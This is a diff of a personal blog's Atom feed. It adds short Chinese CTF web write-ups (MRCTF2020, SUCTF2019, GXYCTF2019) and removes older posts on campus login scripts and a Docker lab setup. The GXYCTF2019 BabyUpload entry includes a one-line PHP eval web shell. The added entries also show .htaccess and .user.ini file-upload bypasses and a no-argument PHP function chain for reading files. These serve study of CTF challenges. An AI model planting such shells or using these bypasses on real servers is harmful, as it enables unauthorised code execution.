@@ -6,7 +6,7 @@
   <link href="http://haorical.xyz/atom.xml" rel="self"/>
   
   <link href="http://haorical.xyz/"/>
-  <updated>2021-11-17T12:20:11.066Z</updated>
+  <updated>2021-11-18T12:37:02.275Z</updated>
   <id>http://haorical.xyz/</id>
   
   <author>
@@ -17,11 +17,76 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>20211118</title>
+    <link href="http://haorical.xyz/posts/5c3bb6e4/"/>
+    <id>http://haorical.xyz/posts/5c3bb6e4/</id>
+    <published>2021-11-18T12:06:19.000Z</published>
+    <updated>2021-11-18T12:37:02.275Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>上传.htaccess </p><p>上传shell.jpeg</p><p>直接扫目录即可，没有过滤，非常友善</p><pre><code>var_dump(file_get_contents(&#39;/flag&#39;));</code></pre><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>上传.user.ini不过是这样配置才能过</p><pre><code>auto_prepend_file=shell.jpeg</code></pre><p>以前都是</p><pre><code>auto_append_file=1.txt</code></pre><h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>xxe</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;MRCTF2020-你传你🐎呢&quot;&gt;&lt;a href=&quot;#MRCTF2020-你传你🐎呢&quot; class=&quot;headerlink&quot; title=&quot;[MRCTF2020]你传你🐎呢&quot;&gt;&lt;/a&gt;[MRCTF2020]你传你🐎呢&lt;/h2&gt;&lt;p&gt;上传.htaccess </summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>20211117</title>
+    <link href="http://haorical.xyz/posts/cc84ab75/"/>
+    <id>http://haorical.xyz/posts/cc84ab75/</id>
+    <published>2021-11-17T13:53:13.000Z</published>
+    <updated>2021-11-17T15:02:12.474Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>先上传几个正常图片测试，jpeg能用</p><p>上传shell过滤了&lt;?</p><pre><code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;cmd&#39;]);&lt;/script&gt;</code></pre><p>绕过，上传.htaccess</p><pre><code>AddType application/x-httpd-php .jpeg</code></pre><p>把system过滤了</p><p>可以用var_dump打印</p><pre><code>var_dump(scandir(&quot;/&quot;))var_dump(file_get_contents(&quot;/flag&quot;));</code></pre><h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>先githack把git扒下来，有个index.php</p><p>代码审计，过滤的比较多</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123; <span class="comment">#把伪协议读取flag.php给ban了</span></span><br><span class="line">       <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123; <span class="comment">#套娃过滤（无参数过滤） 需要构造一个类似这玩意的东西a(b(c(d(e(f())))));</span></span><br><span class="line">           <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123; <span class="comment">#过滤函数关键字</span></span><br></pre></td></tr></table></figure><p>然后开始构造</p><pre><code>show_source(next(array_reverse(scandir(current(localeconv())))));</code></pre>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;GXYCTF2019-BabyUpload&quot;&gt;&lt;a href=&quot;#GXYCTF2019-BabyUpload&quot; class=&quot;headerlink&quot; title=&quot;[GXYCTF2019]BabyUpload&quot;&gt;&lt;/a&gt;[GXYCTF2019]BabyUpload</summary>
+      
+    
+    
+    
+    <category term="ctf每日一题" scheme="http://haorical.xyz/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
+    
+    
+    <category term="ctf" scheme="http://haorical.xyz/tags/ctf/"/>
+    
+    <category term="web" scheme="http://haorical.xyz/tags/web/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>jwt总结</title>
+    <link href="http://haorical.xyz/posts/e8e4811b/"/>
+    <id>http://haorical.xyz/posts/e8e4811b/</id>
+    <published>2021-11-17T12:54:53.000Z</published>
+    <updated>2021-11-17T12:55:25.313Z</updated>
+    
+    
+    
+    
+    <category term="ctf每日一题" scheme="http://haorical.xyz/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
+    
+    
+    <category term="ctf" scheme="http://haorical.xyz/tags/ctf/"/>
+    
+    <category term="web" scheme="http://haorical.xyz/tags/web/"/>
+    
+  </entry>
+  
+  <entry>
     <title>信息搜集</title>
     <link href="http://haorical.xyz/posts/b21d488/"/>
     <id>http://haorical.xyz/posts/b21d488/</id>
     <published>2021-11-17T11:35:13.000Z</published>
-    <updated>2021-11-17T12:20:11.066Z</updated>
+    <updated>2021-11-17T12:52:11.374Z</updated>
     
     <content type="html"><![CDATA[<h2 id="phps"><a href="#phps" class="headerlink" title="phps"></a>phps</h2><h2 id="git"><a href="#git" class="headerlink" title=".git/"></a>.git/</h2><h2 id="svn"><a href="#svn" class="headerlink" title=".svn/"></a>.svn/</h2><h2 id="swp"><a href="#swp" class="headerlink" title=".swp"></a>.swp</h2><p>ls -al</p><h2 id="http-dbcha-com"><a href="#http-dbcha-com" class="headerlink" title="http://dbcha.com/"></a><a href="http://dbcha.com/">http://dbcha.com/</a></h2><h2 id="admin密码"><a href="#admin密码" class="headerlink" title="/admin密码"></a>/admin密码</h2><h2 id="editor"><a href="#editor" class="headerlink" title="editor"></a>editor</h2><h2 id="tz-php探针"><a href="#tz-php探针" class="headerlink" title="tz.php探针"></a>tz.php探针</h2><h2 id="cdn-绕过"><a href="#cdn-绕过" class="headerlink" title="cdn 绕过"></a>cdn 绕过</h2>]]></content>
     
@@ -47,7 +112,7 @@
     <link href="http://haorical.xyz/posts/1e128b6c/"/>
     <id>http://haorical.xyz/posts/1e128b6c/</id>
     <published>2021-11-15T13:18:08.000Z</published>
-    <updated>2021-11-15T13:19:25.776Z</updated>
+    <updated>2021-11-17T12:52:11.376Z</updated>
     
     <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
     
@@ -464,82 +529,6 @@
     
     <category term="随笔" scheme="http://haorical.xyz/categories/%E9%9A%8F%E7%AC%94/"/>
     
-    
-  </entry>
-  
-  <entry>
-    <title>python实现校园网自动登录</title>
-    <link href="http://haorical.xyz/posts/cfeeb04a/"/>
-    <id>http://haorical.xyz/posts/cfeeb04a/</id>
-    <published>2021-09-22T04:02:25.000Z</published>
-    <updated>2021-09-22T04:52:34.083Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为每次开机都得连校园网，非常的恶心人，所以我用py写了个模拟登录校园网，也是非常的简单，因为只是我自己使用，没考虑推广，我就随便写了写，配置文件啥的都没有，感兴趣的话自己改改代码就行。</p><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>实现了CUMT_Tec和CUMT_Stu的连接，这个我也挺奇怪，tec竟然也能连</p><p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210922121707.png"></p><p>而且竟然能用</p><p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210922121757.png"></p><p>用pyinstaller打包成exe后，设置开机自启动，开机就能自动连了，非常舒服!</p><p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210922121942.png"></p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">TIME = <span class="built_in">int</span>(<span class="built_in">round</span>(time.time() * <span class="number">1000</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;Portal&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;login&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;callback&#x27;</span>: <span class="string">f&#x27;dr<span class="subst">&#123;TIME&#125;</span>&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;login_method&#x27;</span>: <span class="number">1</span>, <span class="comment"># 运营商编号，我这个是联通</span></span><br><span class="line">    <span class="string">&#x27;user_account&#x27;</span>: <span class="string">&#x27;xxxxxxxx@unicom&#x27;</span>, <span class="comment"># xxxx处为学号</span></span><br><span class="line">    <span class="string">&#x27;user_password&#x27;</span>: <span class="string">&#x27;xxxxxxxx&#x27;</span>, <span class="comment"># xxxxx处为密码</span></span><br><span class="line">    <span class="string">&#x27;wlan_user_ip&#x27;</span>: <span class="string">&#x27;xxxxxx&#x27;</span>, <span class="comment"># ipconfig自己获取</span></span><br><span class="line">    <span class="string">&#x27;wlan_user_mac&#x27;</span>: <span class="string">&#x27;00000000000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;wlan_ac_ip&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;wlan_ac_name&#x27;</span>: <span class="string">&#x27;NAS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jsVersion&#x27;</span>: <span class="string">&#x27;3.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;_&#x27;</span>: TIME</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q:0.8,zh-TW;q:0.7,zh-HK;q:0.5,en-US;q:0.3,en;q:0.2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://10.2.5.251/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://10.2.5.251:801/eportal/&#x27;</span></span><br><span class="line"></span><br><span class="line">res = requests.get(url=url, headers=headers, params=data)</span><br><span class="line"></span><br><span class="line">print(res.text)</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&#x27;pause&#x27;</span>)</span><br></pre></td></tr></table></figure><p>然后打包，设置开机自启动就行</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;因为每次开机都得连校园网，非常的恶心人，所以我用py写了个模拟登录校园网，也是非常的简单，因为只是我自己使用，没考虑推广，我就随便写了写，配</summary>
-      
-    
-    
-    
-    <category term="python实践" scheme="http://haorical.xyz/categories/python%E5%AE%9E%E8%B7%B5/"/>
-    
-    
-    <category term="python" scheme="http://haorical.xyz/tags/python/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>中国矿业大学正方教务爬虫</title>
-    <link href="http://haorical.xyz/posts/6f73e94e/"/>
-    <id>http://haorical.xyz/posts/6f73e94e/</id>
-    <published>2021-09-16T15:50:06.000Z</published>
-    <updated>2021-09-16T15:53:18.917Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="中国矿业大学正方教务爬虫"><a href="#中国矿业大学正方教务爬虫" class="headerlink" title="中国矿业大学正方教务爬虫"></a>中国矿业大学正方教务爬虫</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>项目地址：</strong></p><p><a href="https://github.com/Haorical/CUMT-jwxt">https://github.com/Haorical/CUMT-jwxt</a></p><p>配置好后直接运行main.py就可以体验爬取成绩的功能，代码可读性良好，适合二次开发。</p><p>本着服务抗大学子的宗旨，写了这个教务爬虫，用来练手，应该会开发一段时间，目前只<br>实现了模拟登录和爬取成绩，万众瞩目的自动抢课功能由于当前没有开放选课，暂时无法<br>开发，暂时搁置。</p><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><h3 id="模拟登录"><a href="#模拟登录" class="headerlink" title="模拟登录"></a>模拟登录</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>一共写了两个版本，一个是使用selenium的SlowLogin，看名字就看出来了，这个登录的慢<br>而且需要配置webdriver，登录一次大约需要8-10秒钟；另一个是基于requests的<br>FastLogin，这个顾名思义就相当的快了，登录一次不到五秒钟，速度飞起，而且可能我用的<br>vpn比较卡，在校园网上应该能更快。</p><p>两个版本可以自由切换,在config中设置即可，更改login即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">opinions:</span><br><span class="line">  - login: <span class="string">&#x27;fast&#x27;</span></span><br></pre></td></tr></table></figure><p>两个模拟登录都可以直接返回成功登录之后的cookie，可以用来爬之后的界面，非常适合二次开发，欢迎二次开发，最好给个star :)</p><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>先说SlowLogin，比较无脑，获得输入框的xpath，然后直接sendkeys，这里有个比较麻烦<br>的就是验证码的问题，这里我用了webdriver的screenshot方法，将图片保存到本地，然后调用<br>百度的ocr，要花钱(5555)，而且存在识别错现象。因为本来就不是很智能，用人眼看填验证码的话<br>就更不智能了。</p><p>FastLogin这个就非常智能，模拟了发包过程，通过分析登录操作可以知道，先get RSA的公钥再get验证码，分析前端加密js可知，是通过rsa对password进行了加密，我们可以用简单的用python模拟，考虑到搭建环境太复杂，这里是模拟的，没有用exejs和node.js，因此耗费了很长时间，其中jsFunction模拟了js中对RSA的加密。由于get的验证码是二进制文件<br>我们可以直接将其写入文件中，然后调用baiduocr的api识别，或者人工识别，两个函数在FastLogin中可以自由选择，可以通过config.yml进行设置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 智能人工识别验证码</span></span><br><span class="line">code = get_code_by_people(sessions)</span><br><span class="line"><span class="comment"># 人工智能识别验证码</span></span><br><span class="line">code = get_code_by_ocr(sessions)</span><br></pre></td></tr></table></figure><p>config如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">opinions:</span><br><span class="line">  - AI: true</span><br></pre></td></tr></table></figure><p>调用人工识别函数的时候比较有趣，如下，会弹出窗口，然后人工识别</p><p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916224421.png"></p><p>可以看到成功获得了cookie</p><p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916224809.png"></p><p>ocr识别的话，如下</p><p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916225044.png"></p><p>可以看到，只识别了一次，如果识别错误的话，会自动重新登录，直到登录成功</p><h3 id="爬取成绩"><a href="#爬取成绩" class="headerlink" title="爬取成绩"></a>爬取成绩</h3><p>分析抓包即可，页面逻辑比较简单，post后返回的是json数据，解析，保存成了字典，{科目=&gt;[平时分，期末分，总分，学分，绩点]}，因为获得平时分时需要每一科都请求一次，因此速度比较慢，其中也有一些选项，自己探索吧，懒得写了，睡觉！</p><p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916230422.png"></p><p>一些设置如下，需要保存在config.yml中</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">user:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">&#x27;xxxxxxxx&#x27;</span> <span class="string">学号</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">password:</span> <span class="string">&#x27;xxxxxxxxxx&#x27;</span> <span class="string">密码</span></span><br><span class="line"><span class="attr">ocr:</span> <span class="string">百度识图的api</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">&#x27;xxxxxxxxxxx&#x27;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">secret:</span> <span class="string">&#x27;xxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line"><span class="attr">opinions:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">AI:</span> <span class="literal">true</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">login:</span> <span class="string">&#x27;fast&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;中国矿业大学正方教务爬虫&quot;&gt;&lt;a href=&quot;#中国矿业大学正方教务爬虫&quot; class=&quot;headerlink&quot; title=&quot;中国矿业大学正方教务爬虫&quot;&gt;&lt;/a&gt;中国矿业大学正方教务爬虫&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;</summary>
-      
-    
-    
-    
-    <category term="python实践" scheme="http://haorical.xyz/categories/python%E5%AE%9E%E8%B7%B5/"/>
-    
-    
-    <category term="python" scheme="http://haorical.xyz/tags/python/"/>
-    
-    <category term="爬虫" scheme="http://haorical.xyz/tags/%E7%88%AC%E8%99%AB/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>vm+kali+docker实现web题复现</title>
-    <link href="http://haorical.xyz/posts/c52439ad/"/>
-    <id>http://haorical.xyz/posts/c52439ad/</id>
-    <published>2021-09-08T08:32:16.000Z</published>
-    <updated>2021-09-08T09:19:17.616Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>github上有很多web题的源码，可以直接下载搭建用于赛后复现，但vps搭建比较繁琐，分配域名，分配目录，分配端口且非常不安全，虚拟机本地搭建就比较简单，而且可以直接通过宿主机访问，如果源码有docker compose的话会更加简单，一键即可搭建。</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ol><li>vm</li><li>kali</li></ol><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h3><p>命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;debian&#x2F;gpg | sudo apt-key add -</span><br><span class="line"></span><br><span class="line">echo &#39;deb https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;debian stretch stable&#39;&gt; &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;docker.list</span><br><span class="line"></span><br><span class="line">apt-get install apt-transport-https  ca-certificates  curl  gnupg2  software-properties-common</span><br><span class="line"></span><br><span class="line">sudo apt install docker.io</span><br></pre></td></tr></table></figure><p>docker version可查看是否安装成功</p><h3 id="下载lamp镜像"><a href="#下载lamp镜像" class="headerlink" title="下载lamp镜像"></a>下载lamp镜像</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker search lamp 查找镜像</span><br><span class="line"></span><br><span class="line">docker pull mattrayner&#x2F;lamp 下载镜像</span><br><span class="line"></span><br><span class="line">docker images 查看镜像是否安装成功</span><br></pre></td></tr></table></figure><h3 id="搭建题目"><a href="#搭建题目" class="headerlink" title="搭建题目"></a>搭建题目</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 100:80 -p 3307:3306 mattrayner&#x2F;lamp 创建lamp容器，并将docker 80和3306端口分别映射到虚拟机的100和3307端口</span><br><span class="line"></span><br><span class="line">docker ps -a 主要为了获得CONTAINER ID，查看当前运行的容器</span><br><span class="line"></span><br><span class="line">docker cp [题目目录] [CONTAINER ID]:&#x2F;var&#x2F;www&#x2F;html 将题目放到html文件夹</span><br><span class="line"></span><br><span class="line">docker stop [CONTAINER ID] 停止容器</span><br><span class="line"></span><br><span class="line">docker rm [CONTAINER ID] 删除容器</span><br></pre></td></tr></table></figure><h3 id="运行题目"><a href="#运行题目" class="headerlink" title="运行题目"></a>运行题目</h3><p>ifconfig获得kali ip，本机测试是否能ping通，在浏览器输入</p><pre><code>http://[kali ip]:[映射端口]/[题目目录名]/e.g. http://192.168.xxx.xxx:100/ezyii/</code></pre>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;github上有很多web题的源码，可以直接下载搭建用于赛后复现，但vps搭建比较繁琐，分配域名，分配目录，分配端口且非常不安全，虚拟机本地</summary>
-      
-    
-    
-    
-    <category term="开发工具" scheme="http://haorical.xyz/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
-    
-    
-    <category term="ctf" scheme="http://haorical.xyz/tags/ctf/"/>
-    
-    <category term="web" scheme="http://haorical.xyz/tags/web/"/>
     
   </entry>
   
